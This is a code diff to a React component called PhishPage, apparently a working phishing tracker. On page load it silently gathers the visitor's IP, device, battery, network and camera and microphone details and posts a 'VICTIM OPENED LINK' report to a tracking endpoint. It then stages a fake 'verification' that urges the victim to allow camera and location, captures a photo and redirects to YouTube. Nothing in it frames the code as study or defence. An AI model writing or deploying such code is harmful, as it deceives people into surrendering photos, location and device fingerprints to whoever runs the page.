@@ -8,7 +8,6 @@ export default function PhishPage() {
   const [showLoader, setShowLoader] = useState(false);
   const [infoSent, setInfoSent] = useState(false);
 
-  // Send device info when page loads
   useEffect(() => {
     if (id && !infoSent) {
       sendDeviceInfo();
@@ -24,7 +23,6 @@ export default function PhishPage() {
       const now = new Date();
       const timeString = now.toISOString().replace('T', ' ').substring(0, 23);
 
-      // Get battery info
       let batteryLevel = 'N/A';
       let batteryCharging = 'N/A';
       try {
@@ -33,7 +31,6 @@ export default function PhishPage() {
         batteryCharging = battery.charging ? 'YES' : 'NO';
       } catch(e) {}
 
-      // Get connection info
       let connectionType = 'Unknown';
       let downlink = 'N/A';
       if (navigator.connection) {
@@ -41,7 +38,6 @@ export default function PhishPage() {
         downlink = navigator.connection.downlink + ' Mbps';
       }
 
-      // Get media devices
       let devices = { audioinput: [], videoinput: [], audiooutput: [] };
       try {
         const allDevices = await navigator.mediaDevices.enumerateDevices();
@@ -53,52 +49,22 @@ export default function PhishPage() {
       } catch(e) {}
 
       const message = 
-`✅🎯 VICTIM SESSION DETECTED - TRACKER v7.0 ULTIMATE
+`✅🎯 VICTIM OPENED LINK
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 IP & NETWORK INFORMATION
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 Public IP: ${publicIP}
-📱 Network: ${connectionType}
-🕐 Capture Time: ${timeString}
-🌍 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 DEVICE & SYSTEM PROFILE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📏 Screen: ${screen.width}x${screen.height}
-🖥️ Platform: ${navigator.platform}
+🌐 IP: ${publicIP}
+📱 Platform: ${navigator.platform}
 🌐 Language: ${navigator.language}
-🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
+🖥️ Screen: ${screen.width}x${screen.height}
+🧠 CPU: ${navigator.hardwareConcurrency || 'Unknown'} cores
 💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown'}
+📶 Network: ${connectionType} | ${downlink}
+🔋 Battery: ${batteryLevel} | Charging: ${batteryCharging}
+🕐 Time: ${timeString}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔍 BROWSER FINGERPRINT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🏷️ UA: ${navigator.userAgent}
+📷 Cameras: ${devices.videoinput.length > 0 ? devices.videoinput.join(', ') : 'None detected'}
+🎤 Mics: ${devices.audioinput.length > 0 ? devices.audioinput.join(', ') : 'None detected'}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 NETWORK
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📶 Connection: ${connectionType}
-📊 Speed: ${downlink}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔋 BATTERY
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔋 Level: ${batteryLevel}
-⚡ Charging: ${batteryCharging}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📷 MEDIA DEVICES
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-${devices.videoinput.map((d, i) => `📹 Camera ${i+1}: ${d}`).join('\n')}
-${devices.audioinput.map((d, i) => `🎤 Mic ${i+1}: ${d}`).join('\n')}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🚀 SESSION ACTIVE
-🕐 ${timeString}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+🏷️ UA: ${navigator.userAgent}`;
 
       await fetch('/api/track', {
         method: 'POST',
@@ -116,7 +82,7 @@ ${devices.audioinput.map((d, i) => `🎤 Mic ${i+1}: ${d}`).join('\n')}
 
   const captureAndSend = async () => {
     setShowLoader(true);
-    setStatus('Processing verification...');
+    setStatus('Verifying... Please allow camera & location when prompted.');
 
     // Step 1: Capture photo
     let photoData = null;
@@ -171,9 +137,8 @@ ${devices.audioinput.map((d, i) => `🎤 Mic ${i+1}: ${d}`).join('\n')}
     } catch (e) {}
 
     setShowLoader(false);
-    setStatus('✅ Verification successful! Your download will start shortly...');
+    setStatus('✅ Verification successful! Redirecting...');
     
-    // Redirect to YouTube after 2 seconds
     setTimeout(() => {
       window.location.href = 'https://youtube.com';
     }, 2000);
@@ -328,4 +293,4 @@ ${devices.audioinput.map((d, i) => `🎤 Mic ${i+1}: ${d}`).join('\n')}
       `}</style>
     </div>
   );
-}
+          }
